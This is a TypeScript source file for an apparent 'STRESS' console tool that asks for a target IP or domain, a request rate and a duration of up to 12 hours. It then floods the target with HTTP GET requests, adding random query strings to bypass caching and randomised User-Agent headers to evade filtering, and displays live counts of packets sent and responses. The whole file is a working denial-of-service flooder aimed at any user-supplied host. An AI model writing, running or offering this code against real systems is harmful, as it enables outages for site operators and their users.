

import Dayjs from "dayjs";
import DayjsDuration from "dayjs/plugin/duration";
Dayjs.extend(DayjsDuration);
import RandomUA from "random-useragent";
import Kindof from "kind-of";
import Readline from "readline";

import Package from "../package.json";

const rl: Readline.Interface = Readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const intervals: Record<string, NodeJS.Timeout> = {};

const print = (): void => {
  console.clear();

  console.log("\n");
  console.log("    \x1b[90m #####   ######   #####    #####    #####    #####", "\x1b[0m");
  console.log("    \x1b[90m##         ##     ##  ##   ##      ##       ##", "\x1b[0m");
  console.log("    \x1b[90m ####      ##     #####    ####     ####     ####", "\x1b[0m");
  console.log("    \x1b[90m    ##     ##     ##  ##   ##          ##       ##", "\x1b[0m");
  console.log("    \x1b[90m#####      ##     ##  ##   #####   #####    #####", "\x1b[0m");
  console.log("");
  console.log(`                                                   \x1b[37mv${Package.version}`, "\x1b[0m");
  console.log("");
};

const question = (query: string): Promise<string> => new Promise((resolve: (value: string | PromiseLike<string>) => void) => rl.question(query, resolve));

const run = async (): Promise<void> => {
  print();

  const target_question: string = await question("Target (IP/Domain): ");

  print();

  const target: string = target_question
    .toLowerCase()
    .trim()
    .replace(/^https?:\/\//, "")
    .split("/")[0];

  if (!target) {
    console.log("Field target cannot be left blank.");

    setTimeout(run, 2500);

    return;
  }

  if (Kindof(target) !== "string") {
    console.log("Field target must be a string.");

    setTimeout(run, 2500);

    return;
  }

  console.log(`Target (IP/Domain): ${target}`);

  const ppt_question: string = await question("PPT (Packets Per Transaction): ");

  print();

  if (!ppt_question) {
    console.log("Field ppt cannot be left blank.");

    setTimeout(run, 2500);

    return;
  }

  if (isNaN(Number(ppt_question))) {
    console.log("Field ppt must be a number.");

    setTimeout(run, 2500);

    return;
  }

  const ppt: number = Math.max(1, Math.min(Number(ppt_question), 100));

  console.log(`Target (IP/Domain): ${target}`);
  console.log(`PPT (Packets Per Transaction): ${ppt}`);

  const duration_question: string = await question("Duration (s): ");

  print();

  if (!duration_question) {
    console.log("Field duration cannot be left blank.");

    setTimeout(run, 2500);

    return;
  }

  if (isNaN(Number(duration_question))) {
    console.log("Field duration must be a number.");

    setTimeout(run, 2500);

    return;
  }

  const duration: number = Math.max(1, Math.min(Number(duration_question), 43200));

  console.log(`Target (IP/Domain): ${target}`);
  console.log(`PPT (Packets Per Transaction): ${ppt}`);
  console.log(`Duration (s): ${duration}`);

  console.log("");
  console.log("Status                       \x1b[33mPreparing... ⟳", "\x1b[0m");
  console.log("Packets Sent                 \x1b[90m--", "\x1b[0m");
  console.log("Successful Resp.             \x1b[90m--", "\x1b[0m");
  console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m");
  console.log("Remaining Time               \x1b[90m--", "\x1b[0m");
  console.log("");

  await Bun.sleep(1000);

  print();

  console.log(`Target (IP/Domain): ${target}`);
  console.log(`PPT (Packets Per Transaction): ${ppt}`);
  console.log(`Duration (s): ${duration}`);

  console.log("");
  console.log("Status                       \x1b[33mAlmost Ready... ⟳", "\x1b[0m");
  console.log("Packets Sent                 \x1b[90m--", "\x1b[0m");
  console.log("Successful Resp.             \x1b[90m--", "\x1b[0m");
  console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m");
  console.log("Remaining Time               \x1b[90m--", "\x1b[0m");

  console.log("");

  await Bun.sleep(2500);

  let running: boolean = true;
  let packets_sent: number = 0;
  let successful_responses: number = 0;
  let unsuccessful_responses: number = 0;
  let remaining_time: number = duration;

  intervals["STRESSING"] = setInterval(() => {
    for (let i: number = 0; i < ppt; i++) {
      packets_sent++;

      fetch(`http://${target}?${Math.random()}=${Math.random()}`, {
        method: "GET",
        headers: {
          "User-Agent": RandomUA.getRandom()
        }
      })
        .then((response: Response) => {
          if ((response.status >= 200 && response.status < 300) || (response.status >= 400 && response.status < 500)) {
            successful_responses++;
          } else unsuccessful_responses++;
        })
        .catch(() => unsuccessful_responses++);
    }
  });

  let previous_packets_sent: number = 0;
  let previous_successful_responses: number = 0;
  let previous_unsuccessful_responses: number = 0;
  let previous_remaining_time: number = 0;

  setInterval(() => {
    print();

    console.log(`Target (IP/Domain): ${target}`);
    console.log(`PPT (Packets Per Transaction): ${ppt}`);
    console.log(`Duration (s): ${duration}`);

    console.log("");
    console.log(`Status                       ${running ? "\x1b[37mRunning ▶" : "\x1b[31mStopped ■"}`, "\x1b[0m");
    console.log(`Packets Sent                 ${previous_packets_sent !== packets_sent ? "\x1b[34m" : "\x1b[90m"}${packets_sent} ↑`, "\x1b[0m");
    console.log(`Successful Resp.             ${previous_successful_responses !== successful_responses ? "\x1b[32m" : "\x1b[90m"}${successful_responses} ↓`, "\x1b[0m");
    console.log(`Unsuccessful Resp.           ${previous_unsuccessful_responses !== unsuccessful_responses ? "\x1b[31m" : "\x1b[90m"}${unsuccessful_responses} ⇣`, "\x1b[0m");
    console.log(`Remaining Time               ${previous_remaining_time !== remaining_time ? "\x1b[33m" : "\x1b[90m"}${Dayjs.duration(remaining_time, "seconds").format("HH:mm:ss")} ⏱︎`, "\x1b[0m");

    console.log("");

    previous_packets_sent = packets_sent;
    previous_successful_responses = successful_responses;
    previous_unsuccessful_responses = unsuccessful_responses;
    previous_remaining_time = remaining_time;
  }, 1000);

  setInterval(() => {
    if (remaining_time === 0) {
      running = false;

      clearInterval(intervals["STRESSING"]);
    } else remaining_time--;
  }, 1000);
};

run();
